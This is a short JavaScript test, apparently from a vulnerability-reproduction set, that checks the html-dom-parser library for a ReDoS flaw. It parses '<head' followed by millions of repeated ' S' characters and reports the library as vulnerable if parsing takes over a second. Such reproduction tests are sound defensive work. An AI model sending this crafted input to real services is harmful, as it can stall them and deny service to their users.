// test("ReDos in html-dom-parser", () => {
  const parse = require("html-dom-parser");
  const measureTime = require("../utils").measureTime;
  const genstr = require("../utils").genstr;
  let attack_str = "<head" + genstr(4000000, " S");
  let t = measureTime(function () {
    parse(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
